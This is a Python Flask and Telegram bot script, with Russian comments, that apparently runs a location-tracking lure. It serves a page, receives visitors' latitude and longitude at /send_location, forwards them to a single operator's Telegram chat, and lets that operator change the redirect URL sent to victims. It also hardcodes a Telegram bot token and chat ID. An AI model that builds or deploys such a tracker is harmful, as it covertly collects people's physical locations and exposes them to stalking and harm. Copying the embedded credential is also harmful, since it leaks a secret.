from flask import Flask, request, send_from_directory
import requests
from flask_cors import CORS
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os

app = Flask(__name__, static_folder='static')
CORS(app)

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888  # Только ты можешь пользоваться ботом

bot = telebot.TeleBot(BOT_TOKEN)

# Переменная для редиректа, можно менять через бота
redirect_url = "https://example.com"  # Начальный URL редиректа

# --- Функция для отправки координат в Telegram ---
def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    bot.send_message(CHAT_ID, text)

# --- Флask роуты ---
@app.route('/')
def serve_index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        send_to_telegram(lat, lon)
        return {"status": "ok"}
    return {"status": "error"}, 400

# --- Telegram бот команды и кнопки ---

def check_user(message):
    # Проверяем, что пишет только владелец
    return message.from_user.id == CHAT_ID

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not check_user(message):
        bot.reply_to(message, "🚫 Доступ запрещен.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Изменить редирект", callback_data="change_redirect"))
    markup.add(InlineKeyboardButton("Скинуть ссылку на Render", callback_data="send_link"))
    bot.send_message(CHAT_ID, "Привет! Выбирай действие:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    global redirect_url

    if call.from_user.id != CHAT_ID:
        bot.answer_callback_query(call.id, "🚫 Доступ запрещен.")
        return

    if call.data == "change_redirect":
        msg = bot.send_message(CHAT_ID, "Введи новый URL для редиректа:")
        bot.register_next_step_handler(msg, process_redirect_url)

    elif call.data == "send_link":
        bot.send_message(CHAT_ID, f"Вот твоя ссылка на Render:\n{redirect_url}")

def process_redirect_url(message):
    global redirect_url
    if not check_user(message):
        bot.reply_to(message, "🚫 Доступ запрещен.")
        return
    url = message.text.strip()
    # Можно добавить проверку валидности URL, но для простоты — просто принимаем
    redirect_url = url
    bot.send_message(CHAT_ID, f"Редирект обновлен на:\n{redirect_url}")

# --- Убираем webhook и запускаем polling ---
def run_bot():
    bot.remove_webhook()  # Удаляем webhook, чтобы не было конфликта
    bot.infinity_polling()

if __name__ == "__main__":
    # Запускаем бота в отдельном потоке
    threading.Thread(target=run_bot, daemon=True).start()

    # Запускаем Flask сервер
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
